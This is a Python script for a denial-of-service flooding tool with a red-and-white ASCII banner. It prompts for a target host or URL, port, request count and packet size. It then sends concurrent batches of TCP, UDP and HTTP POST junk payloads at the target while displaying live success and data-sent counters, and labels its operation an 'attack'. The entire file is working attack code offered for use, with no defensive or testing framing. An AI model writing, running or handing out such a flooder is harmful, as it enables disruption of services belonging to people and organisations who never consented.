import asyncio
import socket
import http.client
import time
from urllib.parse import urlparse
from colorama import Fore, Style, init
import sys

init(autoreset=True)

TOOL_NAME = f"""
{Fore.RED}███████╗████████╗██████╗  ██████╗███████╗██╗  ██╗
{Fore.WHITE}██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██║  ██║
{Fore.RED}█████╗     ██║   ██████╔╝██║     █████╗  ███████║
{Fore.WHITE}██╔══╝     ██║   ██╔══██╗██║     ██╔══╝  ██╔══██║
{Fore.RED}██║        ██║   ██║  ██║╚██████╗███████╗██║  ██║
{Fore.WHITE}╚═╝        ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
"""

async def resolve_target(target):
    try:
        loop = asyncio.get_event_loop()
        addrinfo = await loop.getaddrinfo(target, None)
        return addrinfo[0][4][0]
    except:
        return None

async def send_tcp(target, port, packet_size, stats):
    try:
        reader, writer = await asyncio.open_connection(target, port)
        writer.write(b'X' * packet_size)
        await writer.drain()
        writer.close()
        stats['tcp']['success'] += 1
        stats['tcp']['total_data'] += packet_size
    except:
        stats['tcp']['failed'] += 1

async def send_udp(target, port, packet_size, stats):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        await asyncio.get_event_loop().sock_sendto(sock, b'X' * packet_size, (target, port))
        stats['udp']['success'] += 1
        stats['udp']['total_data'] += packet_size
    except:
        stats['udp']['failed'] += 1
    finally:
        if sock:
            sock.close()

async def send_http(url, packet_size, stats):
    conn = None
    try:
        parsed = urlparse(url)
        scheme = parsed.scheme
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if scheme == 'https' else 80)
        path = parsed.path or '/'

        if scheme == 'https':
            conn = http.client.HTTPSConnection(host, port, timeout=2)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=2)
        
        body = b'X' * packet_size
        conn.request("POST", path, body)
        resp = conn.getresponse()
        resp.read()
        stats['http']['success'] += 1
        stats['http']['total_data'] += packet_size
    except:
        stats['http']['failed'] += 1
    finally:
        if conn:
            conn.close()

async def attack(target, port, num_requests, packet_size, stats):
    batch_size = 50
    if target.startswith('http'):
        for i in range(0, num_requests, batch_size):
            tasks = [send_http(target, packet_size, stats) for _ in range(min(batch_size, num_requests - i))]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)
    else:
        for i in range(0, num_requests, batch_size):
            current_batch = min(batch_size, num_requests - i)
            tasks = []
            for _ in range(current_batch):
                tasks.append(send_tcp(target, port, packet_size, stats))
                tasks.append(send_udp(target, port, packet_size, stats))
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)

def format_time(seconds):
    hours, remainder = divmod(seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"

async def display_stats(display_target, port, num_requests, packet_size, stats, start_time):
    while True:
        elapsed = time.time() - start_time
        sys.stdout.write('\033[H\033[J')
        
        print(f"{Fore.RED}{Style.BRIGHT}{TOOL_NAME}")
        print(f"{Fore.YELLOW}╔══════════════════════════════════════════════════╗")
        print(f"{Fore.YELLOW}║ {Fore.WHITE}Target: {Fore.CYAN}{display_target}{Fore.WHITE}:{Fore.CYAN}{port}".ljust(51) + f"{Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║ {Fore.WHITE}Requests: {Fore.MAGENTA}{num_requests} {Fore.WHITE}Packet Size: {Fore.MAGENTA}{packet_size} bytes".ljust(51) + f"{Fore.YELLOW}║")
        print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════╝\n")
        
        print(f"{Fore.CYAN}⏳ {Fore.WHITE}Elapsed Time: {Fore.GREEN}{format_time(elapsed)}")
        print(f"{Fore.YELLOW}┌────────────────────────────────────────────┐")
        
        protocols = ['tcp', 'udp', 'http'] if display_target.startswith('http') else ['tcp', 'udp']
        total_success = 0
        total_failed = 0
        total_data = 0
        
        for proto in protocols:
            color = Fore.BLUE if proto == 'tcp' else Fore.MAGENTA if proto == 'udp' else Fore.GREEN
            print(f"{Fore.YELLOW}├────────────── {color}{proto.upper()}{Fore.YELLOW} ──────────────┤")
            success = stats[proto]['success']
            failed = stats[proto]['failed']
            data = stats[proto]['total_data']
            total_success += success
            total_failed += failed
            total_data += data
            print(f"{Fore.WHITE}   Success: {Fore.GREEN}{success:<8} {Fore.WHITE}Failed: {Fore.RED}{failed}")
            print(f"{Fore.WHITE}   Data Sent: {Fore.CYAN}{data // 1024} KB {Fore.WHITE}({data:,} bytes)")
        
        print(f"{Fore.YELLOW}├────────────────────────────────────────────┤")
        print(f"{Fore.WHITE}   Total Success: {Fore.GREEN}{total_success}")
        print(f"{Fore.WHITE}   Total Failed: {Fore.RED}{total_failed}")
        print(f"{Fore.WHITE}   Total Data: {Fore.CYAN}{total_data // 1024} KB {Fore.WHITE}({total_data:,} bytes)")
        print(f"{Fore.YELLOW}└────────────────────────────────────────────┘{Style.RESET_ALL}")
        await asyncio.sleep(1)

async def main():
    print(f"\n{Style.BRIGHT}{Fore.RED}{TOOL_NAME}\n")
    
    original_target = input(f"{Fore.YELLOW}[+] {Fore.WHITE}Enter Target (IP/URL): {Fore.CYAN}").strip()
    port = int(input(f"{Fore.YELLOW}[+] {Fore.WHITE}Enter Port: {Fore.CYAN}").strip())
    num_requests = int(input(f"{Fore.YELLOW}[+] {Fore.WHITE}Number of Requests: {Fore.CYAN}").strip())
    packet_size = int(input(f"{Fore.YELLOW}[+] {Fore.WHITE}Packet Size (bytes): {Fore.CYAN}").strip())
    
    stats = {
        'tcp': {'success': 0, 'failed': 0, 'total_data': 0},
        'udp': {'success': 0, 'failed': 0, 'total_data': 0},
        'http': {'success': 0, 'failed': 0, 'total_data': 0}
    }
    
    display_target = original_target
    target = original_target
    
    if not original_target.startswith('http'):
        resolved_ip = await resolve_target(original_target)
        if not resolved_ip:
            print(f"{Fore.RED}Error: Could not resolve target!")
            return
        target = resolved_ip
    
    start_time = time.time()
    
    display_task = asyncio.create_task(display_stats(display_target, port, num_requests, packet_size, stats, start_time))
    attack_task = asyncio.create_task(attack(target, port, num_requests, packet_size, stats))
    
    try:
        await asyncio.gather(display_task, attack_task)
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Attack stopped by user!{Style.RESET_ALL}")
        sys.exit(0)
